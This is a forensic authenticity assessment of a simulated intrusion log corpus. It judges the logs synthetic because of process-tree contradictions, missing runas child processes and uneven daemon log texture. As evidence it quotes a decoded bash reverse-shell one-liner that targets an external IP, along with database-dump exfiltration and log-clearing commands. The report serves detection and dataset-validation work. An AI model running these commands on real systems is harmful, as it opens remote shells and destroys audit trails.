# Host/EDR Forensics Analyst — Authenticity Assessment
## Verdict
**Assessment:** Synthetic
**Verdict Confidence:** 84
**Synthetic-Confidence Score:** 67

## Executive Summary

The corpus is highly realistic in breadth, source-native formatting, identity reuse, process lifetime handling, and endpoint-to-network correlation. I found no broad PID/ProcessGUID reuse errors, no visible child whose parent had already exited, no Sysmon dependent event outside its process lifetime, and no evidence that the Windows Security record-number reset was accidental. The logs also contain convincing role-specific Linux activity, heterogeneous Windows builds, stable build-specific hashes, varied record-ID gaps, per-host sensor skew, and credible scanner/background texture.

The assessment is nevertheless **Synthetic** because several localized defects are tied to executable semantics rather than narrative tidiness. The strongest are: (1) a reverse-shell command whose required `base64` and descendant `bash` processes are absent while the resulting socket is assigned to the wrapper shell; (2) a redirected `mysqldump` output file created after process start and attributed to `mysqldump`, although that visible command writes only stdout and shell redirection must create the file before `exec`; and (3) three `runas /netonly` attempts with matching 4648 explicit-credential events but no launched `cmd.exe` process anywhere in Security 4688 or Sysmon Event 1. These are difficult to explain as sanitization. Selective collection could explain an isolated missing event, but it does not explain the repeated semantic pattern across multiple independently rendered records.

The score is in the “likely synthetic” band rather than “confidently synthetic” because most of the approximately 1.35 million visible text records are internally disciplined and production-like. The decision rests on a small number of high-value process-contract failures, reinforced by fleet-wide background-daemon texture and selective metadata gaps.

## Evidence For Synthetic

- **[hard_contradiction] Reverse-shell process tree and socket ownership.** `WEB-EXT-01.meridianhcs.local/ecar.json:777` records PID 2702864 at `2024-03-18T13:20:30.782Z` as `/bin/bash` running `echo <base64> | base64 -d | bash`. The decoded payload is `bash -c "bash -i >& /dev/tcp/45.33.32.30/8443 0>&1"`. Execution therefore requires an external `base64`, a pipeline `bash`, and an interactive descendant `bash`. No descendant process is visible before PID 2702864 terminates at `13:21:01.690Z` (`ecar.json:786`). Instead, the TCP connection at `13:20:34.562Z` is assigned directly to the wrapper PID and its wrapper command line (`ecar.json:779`). Zeek confirms the exact tuple at `zeek-dmz/conn.json:1499` (`10.10.3.10:53882 -> 45.33.32.30:8443`, start `13:20:34.211055Z`, duration `8.731994`, `SF`), and ASA confirms build/teardown under connection 1682919 at `fw-perimeter/cisco_asa.log:3458,3460`. The network occurrence is realistic; the endpoint owner is not the process that would own `/dev/tcp`.

- **[hard_contradiction] Shell-redirection file ownership and ordering.** `DB-PROD-01.meridianhcs.local/ecar.json:561` creates PID 1089086 at `2024-03-18T17:15:38.568Z` with command line `mysqldump --single-transaction ehr patients insurance_claims`. The record contains no output-file option because `mysqldump` emits SQL to stdout. Nevertheless, `ecar.json:562` says that same PID creates `/tmp/rpt_0318.sql` at `17:15:40.731Z`, 2.163 seconds after process creation. If the omitted shell command used `> /tmp/rpt_0318.sql`, the parent shell—not `mysqldump`—must open/create the file before the child is executed. Subsequent evidence is coherent (`gzip` at `17:15:55.729Z`, gzip file create at `17:15:59.677Z`, and `scp` at `17:16:19.153Z`; lines 564-573), which makes the initial file attribution look like a semantic renderer shortcut rather than raw endpoint behavior.

- **[hard_contradiction] Three `runas /netonly` executions never launch their requested command.** Sysmon on `WS-MCHEN-01` records:
  - PID 8552 / ProcessGUID `{7b2a0e3f-54af-65f8-e800-00102cf9d1e9}` at `14:50:23.9340816Z`, requesting `cmd.exe /c dir \\DC-01\ADMIN$` (`windows_event_sysmon.xml:7337-7352`);
  - PID 7948 / ProcessGUID `{7b2a0e3f-54dc-65f8-6402-00106babd4c6}` at `14:51:08.2967708Z`, requesting `cmd.exe /c dir \\WEB-EXT-01\ADMIN$` (`windows_event_sysmon.xml:7593` vicinity);
  - PID 8028 / ProcessGUID `{7b2a0e3f-54ec-65f8-df02-00003792e5d9}` at `14:51:24.7901251Z`, requesting `cmd.exe /c dir \\DB-PROD-01\ADMIN$` (`windows_event_sysmon.xml:7706` vicinity).
  Matching Security 4648 records exist at `14:50:27.2427063Z` (record 949280, process `0x2168`), `14:51:11.4472994Z` (949290, `0x1f0c`), and `14:51:28.0780043Z` (949301, `0x1f5c`). All three `runas.exe` processes terminate 6-9 seconds after creation. There is no Sysmon Event 1 or Security 4688 for any requested `cmd.exe /c dir ...` command and no process references any of the three RunAs ProcessGUIDs as parent. With `/netonly`, the credentials are attached to a newly launched process and checked on later network access; the three repeated 4648-without-child sequences violate that execution contract.

- **[contract_gap] An in-window SSH/SCP session is complete in eCAR and Zeek but orphaned in syslog.** The DB-side `scp` flow is `10.10.4.10:44375 -> 10.10.2.30:22` at `17:16:23.165Z` (`DB-PROD-01.../ecar.json:572`). APP-INT eCAR shows inbound flow, sshd PID 2984080, session login `0x153bf321`/session `378793`, file receipt, process termination, and logout (`APP-INT-01.../ecar.json:777-782`). Zeek records a successful 35.338-second SSH interval with 914,362 origin bytes (`zeek-db/conn.json:377`; duplicate observation in `zeek-core/conn.json:10432`). Yet APP-INT syslog contains only `pam_unix(sshd:session): session closed for user root` at `17:16:57.685746Z` and `Removed session 378793` at `17:16:58.233555Z` (`syslog.log:236-237`), with no connection, accepted-authentication, PAM-open, or logind-new-session lines for this in-window lifecycle. Individual collection loss is possible, so this is weighted below the process contradictions.

- **[schema_or_format] Sysmon metadata omission is concentrated in semantically important images.** Of 987 Sysmon Event 1 records, 24 have `Hashes` equal to `-`; they also carry `-` for all PE metadata fields. Eleven of those 24 are directly associated with the unusual activity, including `PSEXESVC.exe`, `DeviceSyncSvc.exe`, `DirectoryCacheSvc.exe`, `msra.exe`, `ms-index-service.exe`, two `curl.exe` executions, three `runas.exe` executions, and `KB5034441_update.exe`. This is especially conspicuous for signed Windows system binaries such as `C:\Windows\System32\curl.exe` (`WS-AJOHNSON-01.../windows_event_sysmon.xml:19312-19327`) and `runas.exe` (`WS-MCHEN-01.../windows_event_sysmon.xml:7337-7352`), while the same host/channel supplies four configured hashes and PE metadata for most other images. A real Sysmon hash failure can occur, but the activity-linked selection is suggestive.

- **[distribution_texture] Fleet-wide debug-like Linux daemon chatter is overrepresented.** Across 3,756 syslog lines, 561 are `irqbalance` and 427 are `snapd`; together they are 988 lines, or 26.3% of all Linux syslog. `irqbalance` appears on all 11 Linux hosts, from 5 messages on WS-OHADDAD to 99 on WEB-EXT. `snapd` appears on 10 of 11 hosts, with 40-83 messages on multiple servers. Examples include per-IRQ classification and affinity diagnostics on APP-INT (`syslog.log:8,11,17,19`) and WEB-EXT (`syslog.log:23,29,36,49`), plus `snapd-desktop-integration` activity on the headless-looking WEB-EXT and APP-INT roles (`WEB-EXT syslog.log:43`; `APP-INT syslog.log:21`). A fleet-wide diagnostic policy could cause this, but the same small family of verbose background templates dominating nearly every role is atypical production texture.

- **[weak_signal] The three RunAs parents are behaviorally discontinuous.** In the same 61-second reconnaissance burst, the RunAs parents are respectively `explorer.exe`, a visible `cmd.exe`, and `OUTLOOK.EXE`. The third parent is recorded explicitly in the Event 1 for ProcessGUID `{7b2a0e3f-54ec-65f8-df02-00003792e5d9}`. Parent variation is possible, but it is difficult to reconcile with one operator issuing three nearly identical commands in sequence and reinforces the missing-child defect.

## Evidence For Real

- **Process lifecycle integrity is unusually strong.** Across the visible eCAR process corpus (2,049 creates and 1,893 terminations), I found no termination preceding its create, no create/terminate PID or image mismatch, no overlapping PID reuse, and no visible child created after its parent terminated. Across all 10 Windows Sysmon files, Events 3, 7, 8, 10, 11, 13, and 22 never reference a visible ProcessGUID before its Event 1 or after its Event 5. Pre-window processes were treated as pre-window rather than counted as errors.

- **Windows process identities correlate with varied, source-plausible latency.** Security contains 988 Event 4688 records and Sysmon contains 987 Event 1 records. Per host, almost every Security process create matches a Sysmon create by PID and image within well under one second: DC-01 matches 155/155 with deltas from 0.036 to 0.620 seconds; DC-02 matches 119/119 with a maximum near 0.642 seconds; FILE-SRV-01 matches 111/111; MAIL-FIN-01 matches 102/102. This is not treated as synthetic merely because it is complete; the varied sub-second latency and preserved identities are realistic implementation details.

- **ProcessGUIDs and hashes have coherent host/build behavior.** ProcessGUIDs are unique and use stable per-host first segments with the time-bearing middle fields changing, for example `{83eb9c06-2d31-65f8-7500-0000bbad8bad}` on DC-01, `{d55311aa-2d1a-65f8-9700-00000bb8cdf1}` on DC-02, and `{fd907e59-2cec-65f8-8d00-00002974f9e0}` on WS-AJOHNSON. Repeated images keep the same SHA1/MD5/SHA256/IMPHASH on the same build, while the hashes change with Windows build. For `taskhostw.exe`, the visible SHA256 values are `398CF399...` for version 10.0.17763.1, `11057D51...` for 10.0.19041.1, `FFAF350E...` for 10.0.20348.1, and `C0F45497...` for 10.0.22621.1. `WmiPrvSE.exe` shows the same four-build distinction.

- **Network correlation contains realistic sensor differences.** Exact eCAR-to-Zeek tuple matching is high but not artificially timestamp-identical. Representative eCAR match counts are DC-01 4,439/4,583, DC-02 3,900/4,054, APP-INT 514/533, DB-PROD 427/436, FILE-LNX 596/599, and WEB-EXT 3,993/4,107. Median endpoint-minus-Zeek offsets vary stably by host, including DC-01 `+0.168 s`, DC-02 `+0.788 s`, FILE-SRV-01 `-0.176 s`, APP-INT `+1.173 s`, DB-PROD `+0.549 s`, WS-AJOHNSON `-0.802 s`, and WS-DRAMIREZ `+0.784 s`. Sysmon Event 3 medians align with those same host directions. The duplicate Zeek views of the SCP session differ slightly in bytes and missed-byte accounting rather than being copied records.

- **Windows Security schema and record-number behavior are source-native.** Event 4624 v2 and 5156 v1 carry the expected field families; Sysmon versions are appropriate to their event types. DC-01's sole record-ID decrease is explained by the visible `wevtutil cl Security` chain at eCAR lines 5453 and 5460 (`17:42:30.333Z` and `17:42:30.460Z`) followed by Event 1102 at `17:42:34.1403972Z` with EventRecordID 1. The 1102 uses the `Microsoft-Windows-Eventlog` provider and `LogFileCleared` UserData rather than a generic Security EventData template. Other records are monotonic with varied gaps.

- **Service/task/account chains preserve source-specific semantics.** On DC-01, eCAR shows a PSEXESVC file create at `15:59:36.546Z`, service create at `15:59:36.814Z`, Security 4697 record 28256396 at `15:59:36.8804041Z`, service process start, and child `cmd.exe /c whoami && hostname` at `15:59:39.790Z` (`ecar.json:3610-3621`). `DeviceSyncSvc` is authored with `start= auto`; Security 4697 record 28257318 correctly renders start type 2 at `16:19:35.0780586Z`, followed by task 4698 record 28257321 and service execution at `16:30:30.284Z`. The temporary `svc_dirsync` account uses one SID through 4720, 4724, 4738, 4728, and post-clear 4726 records.

- **Linux role and noise texture is otherwise convincing.** All 3,756 syslog records are parseable RFC5424. WEB-EXT has 828 kernel/UFW messages with scanner-specific TTLs and varied ports/window sizes; for example, source `185.220.233.25` repeatedly uses TTL 117 while other sources use different stable fingerprints. FILE-LNX has Samba and `smbd_audit`; MAIL hosts have Postfix/Dovecot; DB-PROD has multipathd; workstations have NetworkManager/dhclient/desktop activity. The 317 bash-history commands contain 240 unique commands, use epoch markers, remain chronological within each file, and do not show same-second batching.

- **Sysmon enrichment is diverse where present.** The 756 ProcessAccess events contain 184 distinct call traces across 28 source/target image pairs and several access masks; only one uses `0x1FFFFF`. The 138 ImageLoad events contain vendor-consistent signature states for Microsoft, Google, Mozilla, Cisco, Zscaler, Dropbox, and unsigned 7-Zip components rather than a single universal signer.

## Detailed Analysis

The review covered the visible 6-hour interval beginning around `2024-03-18T12:00:00Z` across 19 endpoint directories, three Zeek sensor directories, the perimeter ASA source, and Snort. The endpoint corpus includes 34,620 eCAR records: 25,560 FLOW CONNECT, 2,049 PROCESS CREATE, 1,893 PROCESS TERMINATE, 2,284 MODULE LOAD, 756 PROCESS OPEN, 277 REGISTRY MODIFY, 959 USER_SESSION LOGIN, and 505 USER_SESSION LOGOUT records. Windows sources include 12,548 Security 5156, 2,131 Security 4769, 988 Security 4688, 829 Security 4689, 7,985 Sysmon Event 3, 1,238 Sysmon Event 22, 987 Sysmon Event 1, and 842 Sysmon Event 5 records.

**Windows process, session, and identity behavior.**

The ordinary Windows process population is internally sound. System services retain SYSTEM logon `0x3e7`; user processes retain their user and LogonID; dependent Sysmon activity resolves to a live ProcessGUID; and terminating events preserve PID/image identity. The heterogeneous build metadata—Server 2019-like 10.0.17763.1, Server 2022-like 10.0.20348.1, workstation 10.0.19041.1, and 10.0.22621.1—also propagates into file versions and hashes.

The RunAs sequence is the important exception. The three 4648 ProcessIds convert exactly to the Sysmon PIDs (`0x2168`=8552, `0x1f0c`=7948, `0x1f5c`=8028), so this is not an identity-join failure. It is a lifecycle failure after the join: the parent process and explicit-credential audit exist, but the requested process does not. The lack of the child in both Sysmon and Security is more probative than absence from one source. The unrelated `cmd.exe` PID 7872 created at `14:50:59.0460997Z` has parent `explorer.exe` and command line only `C:\Windows\System32\cmd.exe`; it cannot satisfy any of the requested command lines.

The PSEXESVC, DeviceSyncSvc, DirectoryCacheSvc, account, scheduled-task, and log-clear sequences are substantially better. They preserve service start type, parentage through `services.exe` or WMI-launched `cmd.exe`, SYSTEM execution, LogonIDs, and plausible delays between command execution and audit rendering. Those chains materially reduce the likelihood that the data is a simplistic row-level fabrication.

**Linux process, SSH, shell, and file behavior.**

The DB-to-APP-to-file-server transfer is mostly coherent: DB-PROD creates the dump and gzip artifact, `scp` reads the gzip object, the exact SSH tuple appears at both endpoint and Zeek, APP-INT's receiver creates the same path, and `smbclient` later reads it before connecting to FILE-LNX on TCP/445. The visible file object identity is reused correctly on each local host.

Two defects remain. First, the initial dump file is assigned to the wrong process and wrong phase of shell redirection. Second, APP-INT's raw syslog has only the terminal half of the SCP session despite a fully in-window start. The latter could be a collector drop; the former is semantic and cannot be explained by line loss. Likewise, the WEB-EXT reverse shell has a credible network interval but an impossible simplified process lineage.

The ordinary bash-history distribution is convincing and was not penalized for being concise. One noteworthy but non-decisive detail is that `DB-PROD-01.../bash_history/root.bash_history` records `file /tmp/rpt_0318.sql` at epoch 1710782126 and `ls -lh /tmp/rpt_0318.sql.gz` at 1710782147, both before the corresponding eCAR create events, while omitting the `mysqldump` command entirely. That could reflect failed checks and shell history controls, so it is not scored as a contradiction by itself.

**Network and source-observation behavior.**

Flows generally begin in the correct order: transport precedes SSH login, process-backed outbound flows occur during process life, and eCAR/Sysmon timestamps differ from Zeek by stable host-specific offsets rather than by a global constant. Multi-sensor Zeek records preserve the same UID/tuple semantics while allowing small differences in timestamps, bytes, packet counts, history, and missed bytes. ASA byte totals and teardown times are compatible with Zeek intervals in the tested attack flows.

I did not count unmatched ICMP, self-observation, thin host coverage, absent Sysmon event types, or complete cross-source joins as authenticity defects. Domains were treated as potentially sanitized. Similar file timestamps and the ease of following the intrusion were excluded from the decision.

**Environmental and collection plausibility.**

The endpoint fleet has realistic role differentiation, but the Linux background selection is too homogeneous at high verbosity. The exact counts are: APP-INT 69 irqbalance/44 snapd; DB-PROD 66/0; FILE-LNX 75/80; LOG-MON 80/63; LT-MRIVERA 11/10; MAIL-CLIN 54/40; MAIL-EDGE 58/42; PROXY 37/45; WEB-EXT 99/83; WS-LNGUYEN 7/12; WS-OHADDAD 5/8. High-volume diagnostic irqbalance messages and snap refresh state-machine internals can exist, but their fleet-wide deployment across server and workstation roles—plus desktop-integration hooks on web/app servers—looks like a shared synthetic background pool unless a common debug policy can be demonstrated.

## Realism Score by Category
- **Field format accuracy:** 8/10 — Windows XML providers, event versions, field sets, GUIDs, hashes, signatures, RFC5424 syslog, Zeek JSON, and ASA syntax are strong; selective all-`-` Sysmon metadata prevents a higher score.
- **Temporal patterns:** 8/10 — Lifetimes, record gaps, source skew, task/service delays, and transport intervals are convincing; redirected-file ordering and several missing process phases are concrete exceptions.
- **Cross-source correlation:** 9/10 — PID/ProcessGUID, LogonID, service, tuple, UID, account SID, and sensor-offset relationships are excellent. The score is not 10 because the SSH syslog lifecycle is orphaned and RunAs cross-source evidence stops before its required child.
- **Behavioral realism:** 6/10 — Baseline roles, service activity, scanner noise, and attack-adjacent chains are plausible, but three executable-semantics failures occur at critical behavior transitions.
- **Environmental consistency:** 6/10 — Host roles and Windows builds are differentiated, but fleet-wide irqbalance/snapd verbosity and server-side desktop snap hooks are difficult to justify without a common diagnostic configuration.

## Recommendations

1. Reconstruct shell execution at process granularity. The WEB-EXT pipeline should show `base64` and descendant `bash` processes, with `/dev/tcp` attributed to the innermost shell. For redirected commands, record the shell's file-open/create before the child `exec`, not a synthetic file action on `mysqldump`.
2. Enforce a `runas /netonly` lifecycle contract: Process Create for `runas.exe` -> 4648 -> requested child Process Create/4688 -> attempted network access or an explicit failure/cancel outcome. Preserve the real child parent supplied by Windows rather than choosing an unrelated active application.
3. Validate Sysmon Event 1 enrichment against the configured hash algorithms. In particular, compare `curl.exe`, `runas.exe`, and `msra.exe` with known-good executions on the same host/build; a process should not lose all PE metadata merely because it belongs to unusual activity.
4. Apply source-local observation decisions coherently. If SSH connection/auth/open records are retained, retain their close records as a group; if records are dropped, model an explicit collection gap rather than leaving a single close for an otherwise fully observed in-window session.
5. Build Linux background profiles per host role and actual installed package set. Reduce fleet-wide irqbalance debug chatter, avoid desktop snap hooks on headless servers unless installation evidence supports them, and vary daemon verbosity through host-level logging policy rather than one shared message pool.
6. Preserve the existing strengths: build-aware hashes, native event versions, record-ID reset behavior, per-host sensor skew, ProcessGUID lifetime validation, role-specific syslog, and independent multi-sensor packet accounting.
